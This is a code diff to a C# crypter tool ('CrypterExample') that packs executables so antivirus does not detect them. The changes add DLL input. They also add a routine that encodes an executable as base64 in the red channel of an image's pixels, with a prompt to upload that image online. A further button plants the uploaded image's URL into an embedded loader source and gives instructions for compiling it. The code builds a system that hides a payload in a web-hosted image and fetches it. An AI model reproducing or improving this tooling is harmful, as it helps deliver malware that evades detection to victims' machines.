@@ -10,6 +10,7 @@ using System.Threading;
 using System.Diagnostics;
 using Ionic.Zip;
 using Crypter;
+using System.Drawing;
 
 namespace CrypterExample
 {
@@ -24,7 +25,7 @@ namespace CrypterExample
         {
             OpenFileDialog FOpen = new OpenFileDialog()
             {
-                Filter = "Executable Files|*.exe",
+                Filter = "Executable Files|*.exe;*.dll",
                 InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             };
 
@@ -394,7 +395,7 @@ namespace CrypterExample
 		{
 			OpenFileDialog FOpen = new OpenFileDialog()
 			{
-				Filter = "Executable Files|*.exe",
+				Filter = "Executable Files|*.exe;*.dll",
 				InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
 			};
 
@@ -420,6 +421,68 @@ namespace CrypterExample
 			using (FormDoc formDoc = new FormDoc())
 			{
 				formDoc.ShowDialog();
+			}
+		}
+
+		private void button14_Click(object sender, EventArgs e)
+		{
+			string filePath = textBox1.Text;
+			Bitmap img = pixelate(filePath);
+			SaveFileDialog s = new SaveFileDialog();
+			s.DefaultExt = "bmp";
+			s.Filter = "PNG Files|*.png";
+			if (s.ShowDialog() == DialogResult.OK)
+			{
+				img.Save(s.FileName);
+				MessageBox.Show("Upload to web,and copy the link to url.",
+						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+		}
+		public static Bitmap pixelate(string filePath)
+		{
+			Random rnd = new Random();
+			string a = Convert.ToBase64String(System.IO.File.ReadAllBytes(filePath));
+			char[] aR = a.ToCharArray();
+			double sq = Math.Sqrt(aR.Length);
+			int autosize = ((int)sq) + 2;
+			Bitmap imageholder = new Bitmap(autosize, autosize);
+			Graphics g = Graphics.FromImage(imageholder);
+			int fff = 0;
+			while (fff <= aR.Length - 1)
+			{
+				for (int y = 1; y <= imageholder.Height - 1; y++)
+				{
+					for (int x = 1; x <= imageholder.Width - 1; x++)
+					{
+						if (fff <= aR.Length - 1)
+						{
+							int green = rnd.Next(0, 255);
+							int blue = rnd.Next(0, 255);
+
+							int charCode = aR[fff];
+							imageholder.SetPixel(x, y, Color.FromArgb(charCode, 0, 0));
+							fff++;
+						}
+					}
+				}
+			}
+			return imageholder;
+		}
+
+		private void button16_Click(object sender, EventArgs e)
+		{
+			string Source = Resources.imgcrypt;
+			if (textBox4.Text != "")
+			{
+				Source = Source.Replace("123456", textBox4.Text);
+				textBox2.Text = Source;
+				MessageBox.Show("Copy to VS ; Use .NET Framework 2 ; Choose Windows Application.",
+						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+			else
+			{
+				MessageBox.Show("Please enter the url.",
+						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
 			}
 		}
 	}
